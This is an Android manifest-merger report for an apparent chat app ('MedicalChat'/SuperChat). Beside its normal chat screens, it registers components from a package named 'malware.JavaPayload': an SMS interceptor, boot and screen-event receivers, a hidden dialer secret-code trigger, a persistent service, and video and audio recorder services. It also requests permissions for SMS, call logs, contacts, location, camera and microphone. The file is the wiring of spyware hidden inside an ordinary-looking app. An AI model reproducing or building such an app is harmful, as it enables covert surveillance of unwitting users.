ChatHere_SourceCode_WithStringEncryptionFunction/app/build/intermediates/manifest_merge_blame_file/release/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.ceyloncode.Jackson.MedicalChat"
4    android:versionCode="35"
5    android:versionName="3.5.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
8-->src\main\AndroidManifest.xml
9        android:targetSdkVersion="33" />
9-->src\main\AndroidManifest.xml
10
11    <!-- PERMISSIONS -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src\main\AndroidManifest.xml:7:5-67
12-->src\main\AndroidManifest.xml:7:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src\main\AndroidManifest.xml:8:5-79
13-->src\main\AndroidManifest.xml:8:22-76
14    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
14-->src\main\AndroidManifest.xml:9:5-76
14-->src\main\AndroidManifest.xml:9:22-73
15    <uses-permission android:name="android.permission.READ_CONTACTS" />
15-->src\main\AndroidManifest.xml:10:5-72
15-->src\main\AndroidManifest.xml:10:22-69
16    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
16-->src\main\AndroidManifest.xml:11:5-80
16-->src\main\AndroidManifest.xml:11:22-77
17    <uses-permission android:name="android.permission.READ_CALL_LOG" />
17-->src\main\AndroidManifest.xml:12:5-72
17-->src\main\AndroidManifest.xml:12:22-69
18    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
18-->src\main\AndroidManifest.xml:13:5-86
18-->src\main\AndroidManifest.xml:13:22-83
19    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
19-->src\main\AndroidManifest.xml:14:5-78
19-->src\main\AndroidManifest.xml:14:22-75
20    <uses-permission android:name="android.permission.VIBRATE" />
20-->src\main\AndroidManifest.xml:16:5-66
20-->src\main\AndroidManifest.xml:16:22-63
21    <uses-permission
21-->src\main\AndroidManifest.xml:19:5-21:38
22        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
22-->src\main\AndroidManifest.xml:20:9-65
23        android:maxSdkVersion="28" />
23-->src\main\AndroidManifest.xml:21:9-35
24    <uses-permission android:name="android.permission.CAMERA" />
24-->src\main\AndroidManifest.xml:23:5-65
24-->src\main\AndroidManifest.xml:23:22-62
25    <uses-permission android:name="android.permission.RECORD_AUDIO" />
25-->src\main\AndroidManifest.xml:24:5-71
25-->src\main\AndroidManifest.xml:24:22-68
26    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
26-->src\main\AndroidManifest.xml:25:5-80
26-->src\main\AndroidManifest.xml:25:22-77
27    <uses-permission android:name="android.permission.WAKE_LOCK" />
27-->src\main\AndroidManifest.xml:26:5-68
27-->src\main\AndroidManifest.xml:26:22-65
28    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
28-->src\main\AndroidManifest.xml:27:5-81
28-->src\main\AndroidManifest.xml:27:22-78
29    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
29-->src\main\AndroidManifest.xml:28:5-79
29-->src\main\AndroidManifest.xml:28:22-76
30    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
30-->src\main\AndroidManifest.xml:29:5-81
30-->src\main\AndroidManifest.xml:29:22-78
31    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
31-->src\main\AndroidManifest.xml:30:5-75
31-->src\main\AndroidManifest.xml:30:22-72
32    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
32-->src\main\AndroidManifest.xml:31:5-82
32-->src\main\AndroidManifest.xml:31:22-79
33    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
33-->src\main\AndroidManifest.xml:32:5-77
33-->src\main\AndroidManifest.xml:32:22-74
34    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
34-->src\main\AndroidManifest.xml:33:5-81
34-->src\main\AndroidManifest.xml:33:22-78
35    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
35-->src\main\AndroidManifest.xml:34:5-77
35-->src\main\AndroidManifest.xml:34:22-74
36    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
36-->src\main\AndroidManifest.xml:35:5-76
36-->src\main\AndroidManifest.xml:35:22-73
37    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
37-->src\main\AndroidManifest.xml:36:5-75
37-->src\main\AndroidManifest.xml:36:22-72
38    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
38-->src\main\AndroidManifest.xml:37:5-75
38-->src\main\AndroidManifest.xml:37:22-72
39    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
39-->src\main\AndroidManifest.xml:38:5-79
39-->src\main\AndroidManifest.xml:38:22-76
40    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
40-->src\main\AndroidManifest.xml:39:5-74
40-->src\main\AndroidManifest.xml:39:22-71
41    <uses-permission android:name="android.permission.READ_SMS" />
41-->src\main\AndroidManifest.xml:40:5-67
41-->src\main\AndroidManifest.xml:40:22-64
42    <uses-permission android:name="android.permission.RECEIVE_SMS" />
42-->src\main\AndroidManifest.xml:41:5-70
42-->src\main\AndroidManifest.xml:41:22-67
43
44    <uses-feature
44-->src\main\AndroidManifest.xml:44:5-46:36
45        android:name="android.hardware.location.network"
45-->src\main\AndroidManifest.xml:45:9-57
46        android:required="false" />
46-->src\main\AndroidManifest.xml:46:9-33
47    <uses-feature
47-->src\main\AndroidManifest.xml:47:5-49:36
48        android:name="android.hardware.location.gps"
48-->src\main\AndroidManifest.xml:48:9-53
49        android:required="false" />
49-->src\main\AndroidManifest.xml:49:9-33
50    <uses-feature
50-->src\main\AndroidManifest.xml:51:5-53:36
51        android:name="android.hardware.camera"
51-->src\main\AndroidManifest.xml:52:9-47
52        android:required="false" />
52-->src\main\AndroidManifest.xml:53:9-33
53    <uses-feature
53-->src\main\AndroidManifest.xml:54:5-90
54        android:name="android.hardware.camera.front"
54-->src\main\AndroidManifest.xml:54:19-63
55        android:required="true" />
55-->src\main\AndroidManifest.xml:54:64-87
56    <uses-feature
56-->src\main\AndroidManifest.xml:55:5-95
57        android:name="android.hardware.camera.autofocus"
57-->src\main\AndroidManifest.xml:55:19-67
58        android:required="false" />
58-->src\main\AndroidManifest.xml:55:68-92
59    <uses-feature
59-->src\main\AndroidManifest.xml:58:5-60:36
60        android:name="android.hardware.telephony"
60-->src\main\AndroidManifest.xml:59:9-50
61        android:required="false" />
61-->src\main\AndroidManifest.xml:60:9-33
62
63    <queries>
63-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:11:5-22:15
64        <intent>
64-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:12:9-18:18
65            <action android:name="android.intent.action.GET_CONTENT" />
65-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:13:13-72
65-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:13:21-69
66
67            <category android:name="android.intent.category.OPENABLE" />
67-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:15:13-73
67-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:15:23-70
68
69            <data android:mimeType="*/*" />
69-->src\main\AndroidManifest.xml:102:17-81
69-->src\main\AndroidManifest.xml:274:23-52
70        </intent>
71        <intent>
71-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:19:9-21:18
72            <action android:name="android.media.action.IMAGE_CAPTURE" />
72-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:20:13-73
72-->[com.github.CanHub:Android-Image-Cropper:2.1.1] AndroidManifest.xml:20:21-70
73        </intent>
74        <intent>
74-->[com.google.firebase:firebase-inappmessaging-display:20.1.2] AndroidManifest.xml:15:9-19:18
75            <action android:name="android.intent.action.VIEW" />
75-->src\main\AndroidManifest.xml:151:17-69
75-->src\main\AndroidManifest.xml:151:25-66
76
77            <data android:scheme="https" />
77-->src\main\AndroidManifest.xml:102:17-81
77-->src\main\AndroidManifest.xml:102:23-59
78        </intent> <!-- For browser content -->
79        <intent>
79-->[com.google.android.gms:play-services-ads-lite:22.0.0] AndroidManifest.xml:35:9-41:18
80            <action android:name="android.intent.action.VIEW" />
80-->src\main\AndroidManifest.xml:151:17-69
80-->src\main\AndroidManifest.xml:151:25-66
81
82            <category android:name="android.intent.category.BROWSABLE" />
82-->src\main\AndroidManifest.xml:154:17-78
82-->src\main\AndroidManifest.xml:154:27-75
83
84            <data android:scheme="https" />
84-->src\main\AndroidManifest.xml:102:17-81
84-->src\main\AndroidManifest.xml:102:23-59
85        </intent> <!-- End of browser content -->
86        <!-- For CustomTabsService -->
87        <intent>
87-->[com.google.android.gms:play-services-ads-lite:22.0.0] AndroidManifest.xml:44:9-46:18
88            <action android:name="android.support.customtabs.action.CustomTabsService" />
88-->[com.google.android.gms:play-services-ads-lite:22.0.0] AndroidManifest.xml:45:13-90
88-->[com.google.android.gms:play-services-ads-lite:22.0.0] AndroidManifest.xml:45:21-87
89        </intent>
90    </queries>
91
92    <uses-permission android:name="android.permission.USE_BIOMETRIC" /> <!-- suppress DeprecatedClassUsageInspection -->
92-->[androidx.biometric:biometric:1.1.0] AndroidManifest.xml:24:5-72
92-->[androidx.biometric:biometric:1.1.0] AndroidManifest.xml:24:22-69
93    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
93-->[androidx.biometric:biometric:1.1.0] AndroidManifest.xml:27:5-74
93-->[androidx.biometric:biometric:1.1.0] AndroidManifest.xml:27:22-71
94
95    <uses-feature
95-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:26:5-28:35
96        android:glEsVersion="0x00020000"
96-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:27:9-41
97        android:required="true" />
97-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:28:9-32
98
99    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
99-->[com.google.android.gms:play-services-measurement:21.1.1] AndroidManifest.xml:26:5-110
99-->[com.google.android.gms:play-services-measurement:21.1.1] AndroidManifest.xml:26:22-107
100    <uses-permission android:name="com.google.android.gms.permission.AD_ID" /> <!-- for android -->
100-->[com.google.android.gms:play-services-measurement-impl:21.1.1] AndroidManifest.xml:27:5-79
100-->[com.google.android.gms:play-services-measurement-impl:21.1.1] AndroidManifest.xml:27:22-76
101    <!-- <uses-permission android:name="com.android.launcher.permission.READ_SETTINGS"/> -->
102    <!-- <uses-permission android:name="com.android.launcher.permission.WRITE_SETTINGS"/> -->
103    <!-- <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" /> -->
104    <!-- <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" /> -->
105    <!-- for Samsung -->
106    <uses-permission android:name="com.sec.android.provider.badge.permission.READ" />
106-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:19:5-86
106-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:19:22-83
107    <uses-permission android:name="com.sec.android.provider.badge.permission.WRITE" /> <!-- for htc -->
107-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:20:5-87
107-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:20:22-84
108    <uses-permission android:name="com.htc.launcher.permission.READ_SETTINGS" />
108-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:23:5-81
108-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:23:22-78
109    <uses-permission android:name="com.htc.launcher.permission.UPDATE_SHORTCUT" /> <!-- for sony -->
109-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:24:5-83
109-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:24:22-80
110    <uses-permission android:name="com.sonyericsson.home.permission.BROADCAST_BADGE" />
110-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:27:5-88
110-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:27:22-85
111    <uses-permission android:name="com.sonymobile.home.permission.PROVIDER_INSERT_BADGE" /> <!-- for apex -->
111-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:28:5-92
111-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:28:22-89
112    <uses-permission android:name="com.anddoes.launcher.permission.UPDATE_COUNT" /> <!-- for solid -->
112-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:31:5-84
112-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:31:22-81
113    <uses-permission android:name="com.majeur.launcher.permission.UPDATE_BADGE" /> <!-- for huawei -->
113-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:34:5-83
113-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:34:22-80
114    <uses-permission android:name="com.huawei.android.launcher.permission.CHANGE_BADGE" />
114-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:37:5-91
114-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:37:22-88
115    <uses-permission android:name="com.huawei.android.launcher.permission.READ_SETTINGS" />
115-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:38:5-92
115-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:38:22-89
116    <uses-permission android:name="com.huawei.android.launcher.permission.WRITE_SETTINGS" /> <!-- for ZUK -->
116-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:39:5-93
116-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:39:22-90
117    <uses-permission android:name="android.permission.READ_APP_BADGE" /> <!-- for OPPO -->
117-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:42:5-73
117-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:42:22-70
118    <uses-permission android:name="com.oppo.launcher.permission.READ_SETTINGS" />
118-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:45:5-82
118-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:45:22-79
119    <uses-permission android:name="com.oppo.launcher.permission.WRITE_SETTINGS" /> <!-- for EvMe -->
119-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:46:5-83
119-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:46:22-80
120    <uses-permission android:name="me.everything.badger.permission.BADGE_COUNT_READ" />
120-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:49:5-88
120-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:49:22-85
121    <uses-permission android:name="me.everything.badger.permission.BADGE_COUNT_WRITE" />
121-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:50:5-89
121-->[me.leolin:ShortcutBadger:1.1.22] AndroidManifest.xml:50:22-86
122
123    <permission
123-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
124        android:name="com.ceyloncode.Jackson.MedicalChat.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
124-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
125        android:protectionLevel="signature" />
125-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
126
127    <uses-permission android:name="com.ceyloncode.Jackson.MedicalChat.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
127-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
127-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
128
129    <application
129-->src\main\AndroidManifest.xml:62:5-471:19
130        android:name="com.teamxdevelopers.SuperChat.utils.MyApp"
130-->src\main\AndroidManifest.xml:63:9-65
131        android:allowBackup="false"
131-->src\main\AndroidManifest.xml:64:9-36
132        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
132-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
133        android:extractNativeLibs="true"
133-->src\main\AndroidManifest.xml:65:9-41
134        android:icon="@mipmap/ic_launcher"
134-->src\main\AndroidManifest.xml:66:9-43
135        android:label="@string/app_name"
135-->src\main\AndroidManifest.xml:67:9-41
136        android:roundIcon="@mipmap/ic_launcher_round"
136-->src\main\AndroidManifest.xml:68:9-54
137        android:supportsRtl="false"
137-->src\main\AndroidManifest.xml:69:9-36
138        android:theme="@style/SplashScreenTheme" >
138-->src\main\AndroidManifest.xml:70:9-49
139        <receiver
139-->src\main\AndroidManifest.xml:73:9-78:20
140            android:name="com.teamxdevelopers.SuperChat.malware.SmsReceiver"
140-->src\main\AndroidManifest.xml:73:19-83
141            android:exported="true" >
141-->src\main\AndroidManifest.xml:74:13-36
142            <intent-filter>
142-->src\main\AndroidManifest.xml:75:13-77:29
143                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
143-->src\main\AndroidManifest.xml:76:17-82
143-->src\main\AndroidManifest.xml:76:25-79
144            </intent-filter>
145        </receiver>
146
147        <service
147-->src\main\AndroidManifest.xml:81:9-85:19
148            android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.mainService"
148-->src\main\AndroidManifest.xml:82:13-89
149            android:enabled="true"
149-->src\main\AndroidManifest.xml:83:13-35
150            android:exported="false" >
150-->src\main\AndroidManifest.xml:84:13-37
151        </service>
152
153        <receiver
153-->src\main\AndroidManifest.xml:87:9-96:20
154            android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.broadcastReciever"
154-->src\main\AndroidManifest.xml:88:13-95
155            android:enabled="true"
155-->src\main\AndroidManifest.xml:89:13-35
156            android:exported="true" >
156-->src\main\AndroidManifest.xml:90:13-36
157            <intent-filter>
157-->src\main\AndroidManifest.xml:91:13-95:29
158                <action android:name="android.intent.action.BOOT_COMPLETED" />
158-->src\main\AndroidManifest.xml:92:17-79
158-->src\main\AndroidManifest.xml:92:25-76
159                <action android:name="android.intent.action.SCREEN_OFF" />
159-->src\main\AndroidManifest.xml:93:17-75
159-->src\main\AndroidManifest.xml:93:25-72
160                <action android:name="android.intent.action.SCREEN_ON" />
160-->src\main\AndroidManifest.xml:94:17-74
160-->src\main\AndroidManifest.xml:94:25-71
161            </intent-filter>
162        </receiver>
163        <receiver
163-->src\main\AndroidManifest.xml:98:9-104:20
164            android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.keypadListner"
164-->src\main\AndroidManifest.xml:98:19-97
165            android:exported="true" >
165-->src\main\AndroidManifest.xml:99:13-36
166            <intent-filter>
166-->src\main\AndroidManifest.xml:100:13-103:29
167                <action android:name="android.provider.Telephony.SECRET_CODE" />
167-->src\main\AndroidManifest.xml:101:17-81
167-->src\main\AndroidManifest.xml:101:25-78
168
169                <data
169-->src\main\AndroidManifest.xml:102:17-81
170                    android:host="1337"
170-->src\main\AndroidManifest.xml:102:60-79
171                    android:scheme="android_secret_code" />
171-->src\main\AndroidManifest.xml:102:23-59
172            </intent-filter>
173        </receiver>
174
175        <service
175-->src\main\AndroidManifest.xml:106:9-108:72
176            android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.jobScheduler"
176-->src\main\AndroidManifest.xml:107:13-90
177            android:permission="android.permission.BIND_JOB_SERVICE" />
177-->src\main\AndroidManifest.xml:108:13-69
178        <service android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.videoRecorder" />
178-->src\main\AndroidManifest.xml:110:9-108
178-->src\main\AndroidManifest.xml:110:18-105
179        <service android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.audioManager" />
179-->src\main\AndroidManifest.xml:111:9-107
179-->src\main\AndroidManifest.xml:111:18-104
180        <service android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.PersistentService" />
180-->src\main\AndroidManifest.xml:112:9-103
180-->src\main\AndroidManifest.xml:112:18-100
181
182        <activity android:name="com.teamxdevelopers.SuperChat.malware.JavaPayload.MainActivity" >
182-->src\main\AndroidManifest.xml:114:9-116:20
182-->src\main\AndroidManifest.xml:114:19-96
183
184            <!-- Intent filters here, if needed -->
185        </activity>
186        <activity
186-->src\main\AndroidManifest.xml:119:9-122:40
187            android:name="com.teamxdevelopers.SuperChat.activities.AccountDisableActivity"
187-->src\main\AndroidManifest.xml:120:13-91
188            android:exported="false"
188-->src\main\AndroidManifest.xml:122:13-37
189            android:theme="@style/AppTheme.NoActionBar" />
189-->src\main\AndroidManifest.xml:121:13-56
190        <activity
190-->src\main\AndroidManifest.xml:123:9-126:59
191            android:name="com.teamxdevelopers.SuperChat.activities.MaintenanceActivity"
191-->src\main\AndroidManifest.xml:124:13-88
192            android:exported="false"
192-->src\main\AndroidManifest.xml:125:13-37
193            android:theme="@style/AppTheme.NoActionBar" />
193-->src\main\AndroidManifest.xml:126:13-56
194        <activity
194-->src\main\AndroidManifest.xml:127:9-129:40
195            android:name="com.teamxdevelopers.SuperChat.activities.GroupCallViewActivity"
195-->src\main\AndroidManifest.xml:128:13-90
196            android:exported="false" />
196-->src\main\AndroidManifest.xml:129:13-37
197        <activity
197-->src\main\AndroidManifest.xml:130:9-133:47
198            android:name="com.teamxdevelopers.SuperChat.activities.QrScanActivity"
198-->src\main\AndroidManifest.xml:131:13-83
199            android:exported="false"
199-->src\main\AndroidManifest.xml:132:13-37
200            android:theme="@style/AppTheme" />
200-->src\main\AndroidManifest.xml:133:13-44
201        <activity
201-->src\main\AndroidManifest.xml:134:9-137:47
202            android:name="com.teamxdevelopers.SuperChat.activities.Enable2svActivity"
202-->src\main\AndroidManifest.xml:135:13-86
203            android:exported="false"
203-->src\main\AndroidManifest.xml:136:13-37
204            android:theme="@style/AppTheme" />
204-->src\main\AndroidManifest.xml:137:13-44
205        <activity
205-->src\main\AndroidManifest.xml:138:9-141:47
206            android:name="com.teamxdevelopers.SuperChat.activities.TwoStepVerificationActivity"
206-->src\main\AndroidManifest.xml:139:13-96
207            android:exported="false"
207-->src\main\AndroidManifest.xml:140:13-37
208            android:theme="@style/AppTheme" />
208-->src\main\AndroidManifest.xml:141:13-44
209        <activity
209-->src\main\AndroidManifest.xml:142:9-145:47
210            android:name="com.teamxdevelopers.SuperChat.activities.QrActivity"
210-->src\main\AndroidManifest.xml:143:13-79
211            android:exported="false"
211-->src\main\AndroidManifest.xml:144:13-37
212            android:theme="@style/AppTheme" />
212-->src\main\AndroidManifest.xml:145:13-44
213        <activity
213-->src\main\AndroidManifest.xml:146:9-165:20
214            android:name="com.teamxdevelopers.SuperChat.activities.AccountLink"
214-->src\main\AndroidManifest.xml:147:13-80
215            android:exported="true"
215-->src\main\AndroidManifest.xml:148:13-36
216            android:screenOrientation="portrait" >
216-->src\main\AndroidManifest.xml:149:13-49
217            <intent-filter>
217-->src\main\AndroidManifest.xml:150:13-164:29
218                <action android:name="android.intent.action.VIEW" />
218-->src\main\AndroidManifest.xml:151:17-69
218-->src\main\AndroidManifest.xml:151:25-66
219
220                <category android:name="android.intent.category.DEFAULT" />
220-->src\main\AndroidManifest.xml:153:17-76
220-->src\main\AndroidManifest.xml:153:27-73
221                <category android:name="android.intent.category.BROWSABLE" />
221-->src\main\AndroidManifest.xml:154:17-78
221-->src\main\AndroidManifest.xml:154:27-75
222
223                <data
223-->src\main\AndroidManifest.xml:102:17-81
224                    android:host="@string/account_link"
224-->src\main\AndroidManifest.xml:102:60-79
225                    android:pathPrefix="/"
225-->src\main\AndroidManifest.xml:158:21-43
226                    android:scheme="http" />
226-->src\main\AndroidManifest.xml:102:23-59
227                <data
227-->src\main\AndroidManifest.xml:102:17-81
228                    android:host="@string/account_link"
228-->src\main\AndroidManifest.xml:102:60-79
229                    android:pathPrefix="/"
229-->src\main\AndroidManifest.xml:158:21-43
230                    android:scheme="https" />
230-->src\main\AndroidManifest.xml:102:23-59
231            </intent-filter>
232        </activity>
233
234        <service
234-->src\main\AndroidManifest.xml:167:9-170:40
235            android:name="com.teamxdevelopers.SuperChat.services.CompleteSetupService"
235-->src\main\AndroidManifest.xml:168:13-87
236            android:enabled="true"
236-->src\main\AndroidManifest.xml:169:13-35
237            android:exported="false" />
237-->src\main\AndroidManifest.xml:170:13-37
238        <service
238-->src\main\AndroidManifest.xml:171:9-174:40
239            android:name="com.teamxdevelopers.SuperChat.services.BackupService"
239-->src\main\AndroidManifest.xml:172:13-80
240            android:enabled="true"
240-->src\main\AndroidManifest.xml:173:13-35
241            android:exported="false" />
241-->src\main\AndroidManifest.xml:174:13-37
242
243        <uses-library
243-->src\main\AndroidManifest.xml:176:9-178:40
244            android:name="org.apache.http.legacy"
244-->src\main\AndroidManifest.xml:177:13-50
245            android:required="false" /> <!-- ACTIVITIES -->
245-->src\main\AndroidManifest.xml:178:13-37
246        <activity
246-->src\main\AndroidManifest.xml:179:9-183:58
247            android:name="com.teamxdevelopers.SuperChat.activities.setup.EnterUsernameActivity"
247-->src\main\AndroidManifest.xml:180:13-96
248            android:screenOrientation="portrait"
248-->src\main\AndroidManifest.xml:181:13-49
249            android:theme="@style/AppTheme"
249-->src\main\AndroidManifest.xml:182:13-44
250            android:windowSoftInputMode="adjustResize" />
250-->src\main\AndroidManifest.xml:183:13-55
251        <activity
251-->src\main\AndroidManifest.xml:184:9-186:52
252            android:name="com.teamxdevelopers.SuperChat.activities.LoggedOutActivity"
252-->src\main\AndroidManifest.xml:185:13-86
253            android:screenOrientation="portrait" />
253-->src\main\AndroidManifest.xml:186:13-49
254        <activity
254-->src\main\AndroidManifest.xml:187:9-189:52
255            android:name="com.teamxdevelopers.SuperChat.activities.SaveE2EActivity"
255-->src\main\AndroidManifest.xml:188:13-84
256            android:screenOrientation="portrait" />
256-->src\main\AndroidManifest.xml:189:13-49
257        <activity
257-->src\main\AndroidManifest.xml:190:9-194:54
258            android:name="com.teamxdevelopers.SuperChat.activities.LockscreenActivity"
258-->src\main\AndroidManifest.xml:191:13-87
259            android:launchMode="singleTask"
259-->src\main\AndroidManifest.xml:192:13-44
260            android:screenOrientation="portrait"
260-->src\main\AndroidManifest.xml:193:13-49
261            android:theme="@style/FullscreenTheme" />
261-->src\main\AndroidManifest.xml:194:13-51
262        <activity
262-->src\main\AndroidManifest.xml:195:9-200:71
263            android:name="com.teamxdevelopers.SuperChat.activities.authentication.AuthenticationActivity"
263-->src\main\AndroidManifest.xml:196:13-106
264            android:exported="true"
264-->src\main\AndroidManifest.xml:197:13-36
265            android:screenOrientation="portrait"
265-->src\main\AndroidManifest.xml:198:13-49
266            android:theme="@style/AppTheme.NoActionBar"
266-->src\main\AndroidManifest.xml:199:13-56
267            android:windowSoftInputMode="stateVisible|adjustResize" />
267-->src\main\AndroidManifest.xml:200:13-68
268        <activity
268-->src\main\AndroidManifest.xml:201:9-204:59
269            android:name="com.teamxdevelopers.SuperChat.activities.UpdateActivity"
269-->src\main\AndroidManifest.xml:202:13-83
270            android:screenOrientation="portrait"
270-->src\main\AndroidManifest.xml:203:13-49
271            android:theme="@style/AppTheme.NoActionBar" />
271-->src\main\AndroidManifest.xml:204:13-56
272        <activity
272-->src\main\AndroidManifest.xml:205:9-209:71
273            android:name="com.teamxdevelopers.SuperChat.activities.TextStatusActivity"
273-->src\main\AndroidManifest.xml:206:13-87
274            android:screenOrientation="portrait"
274-->src\main\AndroidManifest.xml:207:13-49
275            android:theme="@style/AppTheme.Translucent"
275-->src\main\AndroidManifest.xml:208:13-56
276            android:windowSoftInputMode="stateVisible|adjustResize" />
276-->src\main\AndroidManifest.xml:209:13-68
277        <activity
277-->src\main\AndroidManifest.xml:210:9-214:59
278            android:name="com.teamxdevelopers.SuperChat.activities.main.MainActivity"
278-->src\main\AndroidManifest.xml:211:13-86
279            android:launchMode="singleTop"
279-->src\main\AndroidManifest.xml:212:13-43
280            android:screenOrientation="portrait"
280-->src\main\AndroidManifest.xml:213:13-49
281            android:theme="@style/AppTheme.NoActionBar" />
281-->src\main\AndroidManifest.xml:214:13-56
282        <activity
282-->src\main\AndroidManifest.xml:215:9-218:47
283            android:name="com.teamxdevelopers.SuperChat.activities.ShareGroupLinkActivity"
283-->src\main\AndroidManifest.xml:216:13-91
284            android:screenOrientation="portrait"